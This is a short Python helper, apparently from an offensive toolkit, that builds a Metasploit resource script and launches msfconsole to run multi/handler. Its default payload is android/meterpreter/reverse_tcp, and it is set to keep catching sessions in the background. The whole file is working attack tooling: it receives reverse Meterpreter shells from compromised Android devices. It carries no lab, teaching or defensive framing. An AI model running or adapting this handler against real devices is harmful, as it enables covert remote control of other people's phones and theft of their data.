import subprocess
import tempfile

def start_handler(lhost, lport, payload="android/meterpreter/reverse_tcp"):
    """
    Launches a Metasploit multi/handler with the given LHOST, LPORT, and PAYLOAD.
    """
    resource_script = f"""
use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""
    # Write the resource script to a temp file
    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.rc') as tmpf:
        tmpf.write(resource_script)
        rc_path = tmpf.name
    print(f"[+] Starting Metasploit handler (msfconsole) ...")
    print(f"[i] Press Ctrl+C to stop the handler.")
    try:
        subprocess.run(["msfconsole", "-r", rc_path])
    except KeyboardInterrupt:
        print("\n[!] Metasploit handler stopped.")
